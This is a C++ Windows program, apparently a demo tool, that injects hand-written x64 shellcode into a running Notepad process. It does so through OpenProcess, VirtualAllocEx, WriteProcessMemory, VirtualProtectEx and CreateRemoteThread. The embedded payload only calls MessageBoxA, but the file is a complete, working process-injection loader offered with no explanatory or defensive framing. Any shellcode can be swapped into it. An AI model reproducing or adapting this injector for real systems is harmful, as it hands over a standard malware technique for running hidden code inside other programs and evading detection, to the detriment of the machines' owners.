#include <iostream>
#include <windows.h>

unsigned char payload[] = {
    0x53, 0x56, 0x57, 0x55, 0x48, 0x89, 0xE5, 
    0x48, 0x31, 0xC0,       
    0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
    0x48, 0x31, 0xC9,       
    0x48, 0x31, 0xD2,       
    0x49, 0x31, 0xC0,       
    0x49, 0x31, 0xC9,       
    0xFF, 0xD0,             
    0x5D, 0x5F, 0x5E, 0x5B, 
    0xC3                    
};

int main() {
    SetConsoleCP(1251);
    SetConsoleOutputCP(1251);

    std::cout << "===========================================\n";
    std::cout << "         ADVANCED PROCESS INJECTOR         \n";
    std::cout << "===========================================\n\n";

    HMODULE hUser32 = LoadLibraryA("user32.dll");
    if (!hUser32) {
        std::cerr << "[-] Failed to load user32.dll\n";
        return 1;
    }
    
    LPVOID pMessageBox = (LPVOID)GetProcAddress(hUser32, "MessageBoxA");
    if (!pMessageBox) {
        std::cerr << "[-] Failed to get MessageBoxA address\n";
        FreeLibrary(hUser32);
        return 1;
    }
    
    std::cout << "[*] MessageBoxA address: 0x" << std::hex << (uintptr_t)pMessageBox << std::dec << "\n";

    memcpy(&payload[12], &pMessageBox, sizeof(void*));

    std::cout << "[*] Searching for notepad.exe...\n";
    DWORD pid = 0;
    HWND hwnd = FindWindowA("Notepad", NULL);
    if (hwnd != NULL) {
        GetWindowThreadProcessId(hwnd, &pid);
    } else {
        std::cerr << "[-] Notepad is not running.\n";
        return 1;
    }
    std::cout << "[+] Found PID: " << pid << "\n";

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        std::cerr << "[-] Access denied. Run as Administrator.\n";
        return 1;
    }

    LPVOID remoteBuffer = VirtualAllocEx(hProcess, NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (remoteBuffer == NULL) {
        std::cerr << "[-] Failed to allocate memory.\n";
        CloseHandle(hProcess);
        return 1;
    }
    std::cout << "[+] Memory allocated: 0x" << std::hex << (uintptr_t)remoteBuffer << std::dec << "\n";

    if (!WriteProcessMemory(hProcess, remoteBuffer, payload, sizeof(payload), NULL)) {
        std::cerr << "[-] Failed to write payload.\n";
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    std::cout << "[+] Payload written.\n";

    DWORD oldProtect;
    if (!VirtualProtectEx(hProcess, remoteBuffer, sizeof(payload), PAGE_EXECUTE_READ, &oldProtect)) {
        std::cerr << "[-] Failed to change memory protection.\n";
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }
    std::cout << "[+] Memory protection changed.\n";

    std::cout << "[*] Creating remote thread...\n";
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    if (hThread == NULL) {
        std::cerr << "[-] Failed to create remote thread.\n";
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    WaitForSingleObject(hThread, INFINITE);
    std::cout << "[+] Injection completed!\n";

    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);
    FreeLibrary(hUser32);
    
    return 0;
} 